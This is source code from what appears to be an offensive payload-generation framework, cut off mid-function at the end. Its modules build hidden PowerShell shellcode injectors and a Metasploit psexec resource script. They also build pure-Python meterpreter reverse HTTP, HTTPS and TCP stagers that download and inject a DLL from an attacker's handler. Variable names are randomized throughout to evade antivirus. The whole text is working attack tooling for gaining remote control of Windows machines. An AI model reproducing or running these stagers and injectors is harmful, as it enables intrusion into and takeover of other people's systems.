        powershell_command = blank_command
        powershell_command = base64.b64encode(powershell_command)
        
        downloaderCode = "x86 powershell command:\n"
        downloaderCode += "\tpowershell -NoP -NonI -W Hidden -Exec Bypass -Enc " + powershell_command
        downloaderCode += "\n\nx64 powershell command:\n"
        downloaderCode += "\t%WinDir%\\syswow64\\windowspowershell\\v1.0\\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc " + powershell_command + "\n"

        return downloaderCode

########NEW FILE########
__FILENAME__ = psexec_virtual
"""

Powershell method to inject inline shellcode.
Builds a metasploit .rc resource file to psexec the powershell command easily

Original concept from Matthew Graeber: http://www.exploit-monday.com/2011/10/exploiting-powershells-features-not.html

Note: the architecture independent invoker was developed independently from 
    https://www.trustedsec.com/may-2013/native-powershell-x86-shellcode-injection-on-64-bit-platforms/
    
Port to the msf resource file by @harmj0y

"""

from modules.common import shellcode
from modules.common import helpers

class Payload:
    
    def __init__(self):
        # required
        self.description = "PowerShell VirtualAlloc method for inline shellcode injection that makes a Metasploit psexec_command .rc script"
        self.rating = "Excellent"
        self.language = "powershell"
        self.extension = "rc"
        
        self.shellcode = shellcode.Shellcode()
        
    def psRaw(self):

        Shellcode = self.shellcode.generate()
        Shellcode = ",0".join(Shellcode.split("\\"))[1:]
    
        baseString = """$c = @"
[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr w, uint x, uint y, uint z);
[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr u, uint v, IntPtr w, IntPtr x, uint y, IntPtr z);
[DllImport("msvcrt.dll")] public static extern IntPtr memset(IntPtr x, uint y, uint z);
"@
$o = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru
$x=$o::VirtualAlloc(0,0x1000,0x3000,0x40); [Byte[]]$sc = %s;
for ($i=0;$i -le ($sc.Length-1);$i++) {$o::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1) | out-null;}
$z=$o::CreateThread(0,0,$x,0,0,0); Start-Sleep -Second 100000""" % (Shellcode)

        return baseString
    
    def generate(self):

        encoded = helpers.deflate(self.psRaw())
        
        rcScript = "use auxiliary/admin/smb/psexec_command\n"
        rcScript += "set COMMAND "
        rcScript += "if %PROCESSOR_ARCHITECTURE%==x86 ("
        rcScript += "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \\\"Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\\\\\\\"%s\\\\\\\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();\\\"" % (encoded)
        rcScript += ") else ("
        rcScript += "%%WinDir%%\\\\syswow64\\\\windowspowershell\\\\v1.0\\\\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \\\"Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\\\\\\\"%s\\\\\\\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();\\\")" % (encoded)
        
        return rcScript
        

########NEW FILE########
__FILENAME__ = virtual
"""

Powershell method to inject inline shellcode.

Original concept from Matthew Graeber: http://www.exploit-monday.com/2011/10/exploiting-powershells-features-not.html

Note: the architecture independent invoker was developed independently from 
    https://www.trustedsec.com/may-2013/native-powershell-x86-shellcode-injection-on-64-bit-platforms/


Module built by @harmj0y

"""

from modules.common import shellcode
from modules.common import helpers

class Payload:
    
    def __init__(self):
        # required
        self.description = "PowerShell VirtualAlloc method for inline shellcode injection"
        self.rating = "Excellent"
        self.language = "powershell"
        self.extension = "bat"

        self.shellcode = shellcode.Shellcode()
        
    def psRaw(self):

        Shellcode = self.shellcode.generate()
        Shellcode = ",0".join(Shellcode.split("\\"))[1:]
    
        baseString = """$c = @"
[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr w, uint x, uint y, uint z);
[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr u, uint v, IntPtr w, IntPtr x, uint y, IntPtr z);
[DllImport("msvcrt.dll")] public static extern IntPtr memset(IntPtr x, uint y, uint z);
"@
$o = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru
$x=$o::VirtualAlloc(0,0x1000,0x3000,0x40); [Byte[]]$sc = %s;
for ($i=0;$i -le ($sc.Length-1);$i++) {$o::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1) | out-null;}
$z=$o::CreateThread(0,0,$x,0,0,0); Start-Sleep -Second 100000""" % (Shellcode)

        return baseString
    
    def generate(self):

        encoded = helpers.deflate(self.psRaw())
        
        payloadCode = "@echo off\n"
        payloadCode = "if %PROCESSOR_ARCHITECTURE%==x86 ("
        payloadCode += "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\\\"%s\\\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();\"" % (encoded)
        payloadCode += ") else ("
        payloadCode += "%%WinDir%%\\syswow64\\windowspowershell\\v1.0\\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\\\"%s\\\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();\")" % (encoded)

        return payloadCode

########NEW FILE########
__FILENAME__ = rev_http
"""

Custom-written pure python meterpreter/reverse_http stager,
compatible with Cobalt-Stike's Beacon

Module by @harmj0y

"""

from modules.common import helpers
from modules.common import encryption


class Payload:
    
    def __init__(self):
        # required options
        self.description = "pure windows/meterpreter/reverse_http stager, no shellcode"
        self.language = "python"
        self.extension = "py"
        self.rating = "Excellent"
        
        # options we require user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {"compile_to_exe"   : ["Y", "Compile to an executable"],
                                 "use_pyherion"     : ["N", "Use the pyherion encrypter"],
                                 "LHOST"            : ["", "IP of the metasploit handler"],
                                 "LPORT"            : ["8080", "Port of the metasploit handler"]}
        
    def generate(self):
    
        payloadCode = "import urllib2, string, random, struct, ctypes, time\n"

        # randomize everything, yo'
        sumMethodName = helpers.randomString()
        checkinMethodName = helpers.randomString()

        randLettersName = helpers.randomString()
        randLetterSubName = helpers.randomString()
        randBaseName = helpers.randomString()

        downloadMethodName = helpers.randomString()
        hostName = helpers.randomString()
        portName = helpers.randomString()
        requestName = helpers.randomString()
        tName = helpers.randomString()

        injectMethodName = helpers.randomString()
        dataName = helpers.randomString()
        byteArrayName = helpers.randomString()
        ptrName = helpers.randomString()
        bufName = helpers.randomString()
        handleName = helpers.randomString()
        data2Name = helpers.randomString()

        # helper method that returns the sum of all ord values in a string % 0x100
        payloadCode += "def %s(s): return sum([ord(ch) for ch in s]) %% 0x100\n" %(sumMethodName)
        
        # method that generates a new checksum value for checkin to the meterpreter handler
        payloadCode += "def %s():\n\tfor x in xrange(64):\n" %(checkinMethodName)
        payloadCode += "\t\t%s = ''.join(random.sample(string.ascii_letters + string.digits,3))\n" %(randBaseName)
        payloadCode += "\t\t%s = ''.join(sorted(list(string.ascii_letters+string.digits), key=lambda *args: random.random()))\n" %(randLettersName)
        payloadCode += "\t\tfor %s in %s:\n" %(randLetterSubName, randLettersName)
        payloadCode += "\t\t\tif %s(%s + %s) == 92: return %s + %s\n" %(sumMethodName, randBaseName, randLetterSubName, randBaseName, randLetterSubName)
        
        # method that connects to a host/port over http and downloads the hosted data
        payloadCode += "def %s(%s,%s):\n" %(downloadMethodName, hostName, portName)
        payloadCode += "\t%s = urllib2.Request(\"http://%%s:%%s/%%s\" %%(%s,%s,%s()), None, {'User-Agent' : 'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)'})\n" %(requestName, hostName, portName, checkinMethodName)
        payloadCode += "\ttry:\n"
        payloadCode += "\t\t%s = urllib2.urlopen(%s)\n" %(tName, requestName)
        payloadCode += "\t\ttry:\n"
        payloadCode += "\t\t\tif int(%s.info()[\"Content-Length\"]) > 100000: return %s.read()\n" %(tName, tName)
        payloadCode += "\t\t\telse: return ''\n"
        payloadCode += "\t\texcept: return %s.read()\n" %(tName)
        payloadCode += "\texcept urllib2.URLError, e: return ''\n"
        
        # method to inject a reflective .dll into memory
        payloadCode += "def %s(%s):\n" %(injectMethodName, dataName)
        payloadCode += "\tif %s != \"\":\n" %(dataName)
        payloadCode += "\t\t%s = bytearray(%s)\n" %(byteArrayName, dataName)
        payloadCode += "\t\t%s = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(%s)), ctypes.c_int(0x3000),ctypes.c_int(0x40))\n" %(ptrName, byteArrayName)
        payloadCode += "\t\t%s = (ctypes.c_char * len(%s)).from_buffer(%s)\n" %(bufName, byteArrayName, byteArrayName)
        payloadCode += "\t\tctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(%s),%s, ctypes.c_int(len(%s)))\n" %(ptrName, bufName, byteArrayName)
        payloadCode += "\t\t%s = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(%s),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n" %(handleName, ptrName)
        payloadCode += "\t\tctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(%s),ctypes.c_int(-1))\n" %(handleName)
        
        # download the metpreter .dll and inject it
        payloadCode += "%s = ''\n" %(data2Name)
        payloadCode += "%s = %s(\"%s\", %s)\n" %(data2Name, downloadMethodName, self.required_options["LHOST"][0], self.required_options["LPORT"][0])
        payloadCode += "%s(%s)\n" %(injectMethodName, data2Name)

        if self.required_options["use_pyherion"][0].lower() == "y":
            payloadCode = encryption.pyherion(payloadCode)

        return payloadCode


########NEW FILE########
__FILENAME__ = rev_https
"""

Custom-written pure python meterpreter/reverse_https stager.

Module by @harmj0y

"""

from modules.common import helpers
from modules.common import encryption

class Payload:
    
    def __init__(self):
        # required options
        self.description = "pure windows/meterpreter/reverse_https stager, no shellcode"
        self.language = "python"
        self.rating = "Excellent"
        self.extension = "py"
        
        # options we require user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {"compile_to_exe"   : ["Y", "Compile to an executable"],
                                 "use_pyherion"    : ["N", "Use the python encrypter"],
                                 "LHOST"            : ["", "IP of the metasploit handler"],
                                 "LPORT"            : ["8443", "Port of the metasploit handler"]}
        
    def generate(self):
    
        payloadCode = "import urllib2, string, random, struct, ctypes, httplib, time\n"

        # randomize everything, yo'
        sumMethodName = helpers.randomString()
        checkinMethodName = helpers.randomString()

        randLettersName = helpers.randomString()
        randLetterSubName = helpers.randomString()
        randBaseName = helpers.randomString()

        downloadMethodName = helpers.randomString()
        hostName = helpers.randomString()
        portName = helpers.randomString()
        requestName = helpers.randomString()
        responseName = helpers.randomString()

        injectMethodName = helpers.randomString()
        dataName = helpers.randomString()
        byteArrayName = helpers.randomString()
        ptrName = helpers.randomString()
        bufName = helpers.randomString()
        handleName = helpers.randomString()
        data2Name = helpers.randomString()

        # helper method that returns the sum of all ord values in a string % 0x100
        payloadCode += "def %s(s): return sum([ord(ch) for ch in s]) %% 0x100\n" %(sumMethodName)
        
        # method that generates a new checksum value for checkin to the meterpreter handler
        payloadCode += "def %s():\n\tfor x in xrange(64):\n" %(checkinMethodName)
        payloadCode += "\t\t%s = ''.join(random.sample(string.ascii_letters + string.digits,3))\n" %(randBaseName)
        payloadCode += "\t\t%s = ''.join(sorted(list(string.ascii_letters+string.digits), key=lambda *args: random.random()))\n" %(randLettersName)
        payloadCode += "\t\tfor %s in %s:\n" %(randLetterSubName, randLettersName)
        payloadCode += "\t\t\tif %s(%s + %s) == 92: return %s + %s\n" %(sumMethodName, randBaseName, randLetterSubName, randBaseName, randLetterSubName)
        
        # method that connects to a host/port over https and downloads the hosted data
        payloadCode += "def %s(%s,%s):\n" %(downloadMethodName, hostName, portName)
        payloadCode += "\t%s = httplib.HTTPSConnection(%s, %s)\n" %(requestName, hostName, portName)
        payloadCode += "\t%s.request(\"GET\", \"/\" + %s() )\n" %(requestName, checkinMethodName)
        payloadCode += "\t%s = %s.getresponse()\n" %(responseName, requestName)
        payloadCode += "\tif %s.status == 200: return %s.read()\n" %(responseName, responseName)
        payloadCode += "\telse: return \"\"\n"

        # method to inject a reflective .dll into memory
        payloadCode += "def %s(%s):\n" %(injectMethodName, dataName)
        payloadCode += "\tif %s != \"\":\n" %(dataName)
        payloadCode += "\t\t%s = bytearray(%s)\n" %(byteArrayName, dataName)
        payloadCode += "\t\t%s = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(%s)), ctypes.c_int(0x3000),ctypes.c_int(0x40))\n" %(ptrName, byteArrayName)
        payloadCode += "\t\t%s = (ctypes.c_char * len(%s)).from_buffer(%s)\n" %(bufName, byteArrayName, byteArrayName)
        payloadCode += "\t\tctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(%s),%s, ctypes.c_int(len(%s)))\n" %(ptrName, bufName, byteArrayName)
        payloadCode += "\t\t%s = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(%s),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n" %(handleName, ptrName)
        payloadCode += "\t\tctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(%s),ctypes.c_int(-1))\n" %(handleName)
        
        # download the metpreter .dll and inject it
        payloadCode += "%s = ''\n" %(data2Name)
        payloadCode += "%s = %s(\"%s\", %s)\n" %(data2Name, downloadMethodName, self.required_options["LHOST"][0], self.required_options["LPORT"][0])
        payloadCode += "%s(%s)\n" %(injectMethodName, data2Name)

        if self.required_options["use_pyherion"][0].lower() == "y":
            payloadCode = crypters.pyherion(payloadCode)

        return payloadCode

########NEW FILE########
__FILENAME__ = rev_https_contained
"""

Reads in metsrv.dll, patches it with appropriate options for a 
meterpreter reverse_https payload compresses/bas64 encodes it 
and then builds a python injection wrapper to inject the contained 
meterpreter dll into memory.

Concept and module by @harmj0y

"""

import struct, string, random, sys, os

from modules.common import helpers
from modules.common import encryption

import settings


class Payload:
    
    def __init__(self):
        # required options
        self.description = "self-contained windows/meterpreter/reverse_https stager, no shellcode"
        self.language = "python"
        self.rating = "Excellent"
        self.extension = "py"
        
        # options we require user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
                                 "use_pyherion" : ["N", "Use the pyherion encrypter"],
                                 "inject_method" : ["virtual", "[virtual]alloc or [void]pointer"],
                                 "LHOST" : ["", "IP of the metasploit handler"],
                                 "LPORT" : ["443", "Port of the metasploit handler"]}
        
        
    # helper for the metasploit http checksum algorithm
    def checksum8(self, s):
        # hard rubyish way -> return sum([struct.unpack('<B', ch)[0] for ch in s]) % 0x100
        return sum([ord(ch) for ch in s]) % 0x100

    # generate a metasploit http handler compatible checksum for the URL
    def genHTTPChecksum(self, value="CONN"):
        checkValue = 0
        if value == "INITW": checkValue = 92 # normal initiation
        if value == "INITJ": checkValue = 88
        else: checkValue = 98 # 'CONN', for existing/"orphaned" connections
        
        chk = string.ascii_letters + string.digits
        for x in xrange(64):
            uri = "".join(random.sample(chk,3))
            r = "".join(sorted(list(string.ascii_letters+string.digits), key=lambda *args: random.random()))
            for char in r:
                if self.checksum8(uri + char) == checkValue:
                    return uri + char
                    
    def generate(self):
        
        if os.path.exists(settings.METASPLOIT_PATH + "/data/meterpreter/metsrv.x86.dll"):
            metsrvPath = settings.METASPLOIT_PATH + "/data/meterpreter/metsrv.x86.dll"
        else:
            metsrvPath = settings.METASPLOIT_PATH + "/data/meterpreter/metsrv.dll"
            
        f = open(metsrvPath, 'rb')
        meterpreterDll = f.read()
        f.close()
        
        # lambda function used for patching the metsvc.dll
        dllReplace = lambda dll,ind,s: dll[:ind] + s + dll[ind+len(s):]

        # patch the metsrv.dll header
        headerPatch = "\x4d\x5a\xe8\x00\x00\x00\x00\x5b\x52\x45\x55\x89\xe5\x81\xc3\x57"
        headerPatch += "\x87\x05\x00\xff\xd3\x89\xc3\x57\x68\x04\x00\x00\x00\x50\xff\xd0"
        headerPatch += "\x68\xe0\x1d\x2a\x0a\x68\x05\x00\x00\x00\x50\xff\xd3\x00\x00\x00"
        meterpreterDll = dllReplace(meterpreterDll,0,headerPatch)

        # patch in the default user agent string
        userAgentIndex = meterpreterDll.index("METERPRETER_UA\x00")
        userAgentString = "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)\x00"
        meterpreterDll = dllReplace(meterpreterDll,userAgentIndex,userAgentString)

        # turn off SSL
        sslIndex = meterpreterDll.index("METERPRETER_TRANSPORT_SSL")
        sslString = "METERPRETER_TRANSPORT_HTTPS\x00"
        meterpreterDll = dllReplace(meterpreterDll,sslIndex,sslString)

        # replace the URL/port of the handler
        urlIndex = meterpreterDll.index("https://" + ("X" * 256))
        urlString = "https://" + self.required_options['LHOST'][0] + ":" + str(self.required_options['LPORT'][0]) + "/" + self.genHTTPChecksum() + "_" + helpers.randomString(16) + "/\x00"
        meterpreterDll = dllReplace(meterpreterDll,urlIndex,urlString)
        
        # replace the expiration timeout with the default value of 300
        expirationTimeoutIndex = meterpreterDll.index(struct.pack('<I', 0xb64be661))
        expirationTimeout = struct.pack('<I', 604800)
        meterpreterDll = dllReplace(meterpreterDll,expirationTimeoutIndex,expirationTimeout)

        # replace the communication timeout with the default value of 300
        communicationTimeoutIndex = meterpreterDll.index(struct.pack('<I', 0xaf79257f))
        communicationTimeout = struct.pack('<I', 300)
        meterpreterDll = dllReplace(meterpreterDll,communicationTimeoutIndex,communicationTimeout)

        # compress/base64 encode the dll
        compressedDll = helpers.deflate(meterpreterDll)
        
        # actually build out the payload
        payloadCode = ""
        
        # traditional void pointer injection
        if self.required_options["inject_method"][0].lower() == "void":

            # doing void * cast
            payloadCode += "from ctypes import *\nimport base64,zlib\n"

            randInflateFuncName = helpers.randomString()
            randb64stringName = helpers.randomString()
            randVarName = helpers.randomString()

            # deflate function
            payloadCode += "def "+randInflateFuncName+"("+randb64stringName+"):\n"
            payloadCode += "\t" + randVarName + " = base64.b64decode( "+randb64stringName+" )\n"
            payloadCode += "\treturn zlib.decompress( "+randVarName+" , -15)\n"

            randVarName = helpers.randomString()
            randFuncName = helpers.randomString()
            
            payloadCode += randVarName + " = " + randInflateFuncName + "(\"" + compressedDll + "\")\n"
            payloadCode += randFuncName + " = cast(" + randVarName + ", CFUNCTYPE(c_void_p))\n"
            payloadCode += randFuncName+"()\n"

        # VirtualAlloc() injection
        else:

            payloadCode += 'import ctypes,base64,zlib\n'

            randInflateFuncName = helpers.randomString()
            randb64stringName = helpers.randomString()
            randVarName = helpers.randomString()
            randPtr = helpers.randomString()
            randBuf = helpers.randomString()
            randHt = helpers.randomString()

            # deflate function
            payloadCode += "def "+randInflateFuncName+"("+randb64stringName+"):\n"
            payloadCode += "\t" + randVarName + " = base64.b64decode( "+randb64stringName+" )\n"
            payloadCode += "\treturn zlib.decompress( "+randVarName+" , -15)\n"

            payloadCode += randVarName + " = bytearray(" + randInflateFuncName + "(\"" + compressedDll + "\"))\n"
            payloadCode += randPtr + ' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len('+ randVarName +')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n'
            payloadCode += randBuf + ' = (ctypes.c_char * len(' + randVarName + ')).from_buffer(' + randVarName + ')\n'
            payloadCode += 'ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + randPtr + '),' + randBuf + ',ctypes.c_int(len(' + randVarName + ')))\n'
            payloadCode += randHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + randPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
            payloadCode += 'ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + randHt + '),ctypes.c_int(-1))\n'

        
        if self.required_options["use_pyherion"][0].lower() == "y":
            payloadCode = encryption.pyherion(payloadCode)

        return payloadCode

########NEW FILE########
__FILENAME__ = rev_http_contained
"""

Reads in metsrv.dll, patches it with appropriate options for a 
meterpreter reverse_http payload compresses/bas64 encodes it 
and then builds a python injection wrapper to inject the contained 
meterpreter dll into memory.

Concept and module by @harmj0y

"""

import struct, string, random, sys, os

from modules.common import helpers
from modules.common import encryption

import settings


class Payload:
    
    def __init__(self):
        # required options
        self.description = "self-contained windows/meterpreter/reverse_http stager, no shellcode"
        self.language = "python"
        self.rating = "Excellent"
        self.extension = "py"
        
        # options we require user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
                                 "use_pyherion" : ["N", "Use the pyherion encrypter"],
                                 "inject_method" : ["virtual", "[virtual]alloc or [void]pointer"],
                                 "LHOST" : ["", "IP of the metasploit handler"],
                                 "LPORT" : ["80", "Port of the metasploit handler"]}
        
        
    # helper for the metasploit http checksum algorithm
    def checksum8(self, s):
        # hard rubyish way -> return sum([struct.unpack('<B', ch)[0] for ch in s]) % 0x100
        return sum([ord(ch) for ch in s]) % 0x100

    # generate a metasploit http handler compatible checksum for the URL
    def genHTTPChecksum(self, value="CONN"):
        checkValue = 0
        if value == "INITW": checkValue = 92 # normal initiation
        if value == "INITJ": checkValue = 88
        else: checkValue = 98 # 'CONN', for existing/"orphaned" connections
        
        chk = string.ascii_letters + string.digits
        for x in xrange(64):
            uri = "".join(random.sample(chk,3))
            r = "".join(sorted(list(string.ascii_letters+string.digits), key=lambda *args: random.random()))
            for char in r:
                if self.checksum8(uri + char) == checkValue:
                    return uri + char
                    
    def generate(self):
        
        if os.path.exists(settings.METASPLOIT_PATH + "/data/meterpreter/metsrv.x86.dll"):
            metsrvPath = settings.METASPLOIT_PATH + "/data/meterpreter/metsrv.x86.dll"
        else:
            metsrvPath = settings.METASPLOIT_PATH + "/data/meterpreter/metsrv.dll"
            
        f = open(metsrvPath, 'rb')
        meterpreterDll = f.read()
        f.close()
        
        # lambda function used for patching the metsvc.dll
        dllReplace = lambda dll,ind,s: dll[:ind] + s + dll[ind+len(s):]

        # patch the metsrv.dll header
        headerPatch = "\x4d\x5a\xe8\x00\x00\x00\x00\x5b\x52\x45\x55\x89\xe5\x81\xc3\x57"
        headerPatch += "\x87\x05\x00\xff\xd3\x89\xc3\x57\x68\x04\x00\x00\x00\x50\xff\xd0"
        headerPatch += "\x68\xe0\x1d\x2a\x0a\x68\x05\x00\x00\x00\x50\xff\xd3\x00\x00\x00"
        meterpreterDll = dllReplace(meterpreterDll,0,headerPatch)

        # patch in the default user agent string
        userAgentIndex = meterpreterDll.index("METERPRETER_UA\x00")
        userAgentString = "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)\x00"
        meterpreterDll = dllReplace(meterpreterDll,userAgentIndex,userAgentString)

        # turn off SSL
        sslIndex = meterpreterDll.index("METERPRETER_TRANSPORT_SSL")
        sslString = "METERPRETER_TRANSPORT_HTTP\x00"
        meterpreterDll = dllReplace(meterpreterDll,sslIndex,sslString)

        # replace the URL/port of the handler
        urlIndex = meterpreterDll.index("https://" + ("X" * 256))
        urlString = "http://" + self.required_options['LHOST'][0] + ":" + str(self.required_options['LPORT'][0]) + "/" + self.genHTTPChecksum() + "_" + helpers.randomString(16) + "/\x00"
        meterpreterDll = dllReplace(meterpreterDll,urlIndex,urlString)
        
        # replace the expiration timeout with the default value of 300
        expirationTimeoutIndex = meterpreterDll.index(struct.pack('<I', 0xb64be661))
        expirationTimeout = struct.pack('<I', 604800)
        meterpreterDll = dllReplace(meterpreterDll,expirationTimeoutIndex,expirationTimeout)

        # replace the communication timeout with the default value of 300
        communicationTimeoutIndex = meterpreterDll.index(struct.pack('<I', 0xaf79257f))
        communicationTimeout = struct.pack('<I', 300)
        meterpreterDll = dllReplace(meterpreterDll,communicationTimeoutIndex,communicationTimeout)

        # compress/base64 encode the dll
        compressedDll = helpers.deflate(meterpreterDll)
        
        # actually build out the payload
        payloadCode = ""
        
        # traditional void pointer injection
        if self.required_options["inject_method"][0].lower() == "void":

            # doing void * cast
            payloadCode += "from ctypes import *\nimport base64,zlib\n"

            randInflateFuncName = helpers.randomString()
            randb64stringName = helpers.randomString()
            randVarName = helpers.randomString()

            # deflate function
            payloadCode += "def "+randInflateFuncName+"("+randb64stringName+"):\n"
            payloadCode += "\t" + randVarName + " = base64.b64decode( "+randb64stringName+" )\n"
            payloadCode += "\treturn zlib.decompress( "+randVarName+" , -15)\n"

            randVarName = helpers.randomString()
            randFuncName = helpers.randomString()
            
            payloadCode += randVarName + " = " + randInflateFuncName + "(\"" + compressedDll + "\")\n"
            payloadCode += randFuncName + " = cast(" + randVarName + ", CFUNCTYPE(c_void_p))\n"
            payloadCode += randFuncName+"()\n"

        # VirtualAlloc() injection
        else:

            payloadCode += 'import ctypes,base64,zlib\n'

            randInflateFuncName = helpers.randomString()
            randb64stringName = helpers.randomString()
            randVarName = helpers.randomString()
            randPtr = helpers.randomString()
            randBuf = helpers.randomString()
            randHt = helpers.randomString()

            # deflate function
            payloadCode += "def "+randInflateFuncName+"("+randb64stringName+"):\n"
            payloadCode += "\t" + randVarName + " = base64.b64decode( "+randb64stringName+" )\n"
            payloadCode += "\treturn zlib.decompress( "+randVarName+" , -15)\n"

            payloadCode += randVarName + " = bytearray(" + randInflateFuncName + "(\"" + compressedDll + "\"))\n"
            payloadCode += randPtr + ' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len('+ randVarName +')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n'
            payloadCode += randBuf + ' = (ctypes.c_char * len(' + randVarName + ')).from_buffer(' + randVarName + ')\n'
            payloadCode += 'ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + randPtr + '),' + randBuf + ',ctypes.c_int(len(' + randVarName + ')))\n'
            payloadCode += randHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + randPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
            payloadCode += 'ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + randHt + '),ctypes.c_int(-1))\n'

        
        if self.required_options["use_pyherion"][0].lower() == "y":
            payloadCode = encryption.pyherion(payloadCode)

        return payloadCode

########NEW FILE########
__FILENAME__ = rev_tcp
"""

Custom-written pure python meterpreter/reverse_tcp stager.

By @harmj0y

"""

from modules.common import helpers
from modules.common import encryption

class Payload:
    
    def __init__(self):
        # required options
        self.description = "pure windows/meterpreter/reverse_tcp stager, no shellcode"
        self.language = "python"
        self.rating = "Excellent"
        self.extension = "py"
        
        # optional
        # options we require user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
                                 "use_pyherion" : ["N", "Use the pyherion encrypter"],
                                 "LHOST" : ["", "IP of the metasploit handler"],
                                 "LPORT" : ["4444", "Port of the metasploit handler"],
                                 "expire_payload" : ["X", "Optional: Payloads expire after \"X\" days"]}
        
        
    def generate(self):
        
        # randomize all of the variable names used
        shellCodeName = helpers.randomString()
        socketName = helpers.randomString()
        intervalName = helpers.randomString()
        attemptsName = helpers.randomString()
        getDataMethodName = helpers.randomString()
        fdBufName = helpers.randomString()
        rcvStringName = helpers.randomString()
        rcvCStringName = helpers.randomString()

        injectMethodName = helpers.randomString()
        tempShellcodeName = helpers.randomString()
        shellcodeBufName = helpers.randomString()
        fpName = helpers.randomString()
        tempCBuffer = helpers.randomString()
        
        
        payloadCode = "import struct, socket, binascii, ctypes, random, time\n"

        # socket and shellcode variables that need to be kept global
        payloadCode += "%s, %s = None, None\n" % (shellCodeName,socketName)

        # build the method that creates a socket, connects to the handler,
        # and downloads/patches the meterpreter .dll
        payloadCode += "def %s():\n" %(getDataMethodName)
        payloadCode += "\ttry:\n"
        payloadCode += "\t\tglobal %s\n" %(socketName)
        # build the socket and connect to the handler
        payloadCode += "\t\t%s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n" %(socketName)
        payloadCode += "\t\t%s.connect(('%s', %s))\n" %(socketName,self.required_options["LHOST"][0],self.required_options["LPORT"][0])
        # pack the underlying socket file descriptor into a c structure
        payloadCode += "\t\t%s = struct.pack('<i', %s.fileno())\n" % (fdBufName,socketName)
        # unpack the length of the payload, received as a 4 byte array from the handler
        payloadCode += "\t\tl = struct.unpack('<i', str(%s.recv(4)))[0]\n" %(socketName)
        payloadCode += "\t\t%s = \"     \"\n" % (rcvStringName)
        # receive ALL of the payload .dll data
        payloadCode += "\t\twhile len(%s) < l: %s += %s.recv(l)\n" % (rcvStringName, rcvStringName, socketName)
        payloadCode += "\t\t%s = ctypes.create_string_buffer(%s, len(%s))\n" % (rcvCStringName,rcvStringName,rcvStringName)
        # prepend a little assembly magic to push the socket fd into the edi register
        payloadCode += "\t\t%s[0] = binascii.unhexlify('BF')\n" %(rcvCStringName)
        # copy the socket fd in
        payloadCode += "\t\tfor i in xrange(4): %s[i+1] = %s[i]\n" % (rcvCStringName, fdBufName)
        payloadCode += "\t\treturn %s\n" % (rcvCStringName)
        payloadCode += "\texcept: return None\n"

        # build the method that injects the .dll into memory
        payloadCode += "def %s(%s):\n" %(injectMethodName,tempShellcodeName)
        payloadCode += "\tif %s != None:\n" %(tempShellcodeName)
